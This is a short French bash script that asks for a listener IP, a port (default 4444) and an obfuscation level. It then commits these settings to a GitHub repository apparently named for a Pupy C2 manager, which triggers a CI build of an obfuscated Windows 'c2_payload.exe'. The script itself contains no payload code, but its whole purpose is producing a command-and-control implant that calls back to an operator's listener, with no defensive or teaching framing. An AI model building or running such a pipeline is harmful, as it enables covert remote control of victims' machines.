#!/bin/bash
# Script pour déclencher la compilation Windows via GitHub Actions

echo "🚀 Compilation Windows PE via GitHub Actions"
echo ""
echo "Ce script va pousser un changement vers GitHub pour déclencher"
echo "la compilation d'un .exe Windows VRAI sur un runner Windows."
echo ""

# Demander les paramètres
read -p "IP Listener (défaut: 192.168.1.40): " IP
IP=${IP:-192.168.1.40}

read -p "Port Listener (défaut: 4444): " PORT
PORT=${PORT:-4444}

read -p "Niveau Obfuscation 1-5 (défaut: 5): " OBFUSCATION
OBFUSCATION=${OBFUSCATION:-5}

echo ""
echo "📝 Configuration:"
echo "  ├─ IP: $IP"
echo "  ├─ Port: $PORT"
echo "  └─ Obfuscation: Niveau $OBFUSCATION"
echo ""

# Créer un fichier de config temporaire
cat > build_config.json <<EOF
{
  "listener_ip": "$IP",
  "listener_port": $PORT,
  "obfuscation_level": $OBFUSCATION,
  "platform": "windows",
  "timestamp": "$(date +%s)"
}
EOF

echo "✅ Configuration sauvegardée dans build_config.json"
echo ""

# Commit et push
git add build_config.json
git commit -m "🔧 Windows Build: IP=$IP Port=$PORT Obfuscation=$OBFUSCATION"
git push

echo ""
echo "✅ Push effectué vers GitHub!"
echo ""
echo "📊 Prochaines étapes:"
echo "1. Va sur: https://github.com/kalilBelgoumri/pupy-c2-manager-macos/actions"
echo "2. Clique sur le workflow 'Build C2 Windows PE Binary'"
echo "3. Attends 2-3 minutes pour la compilation"
echo "4. Télécharge l'artifact 'c2-payload-windows' (vrai .exe Windows)"
echo ""
echo "💡 L'artifact contient le fichier c2_payload.exe compilé sur Windows!"
echo ""
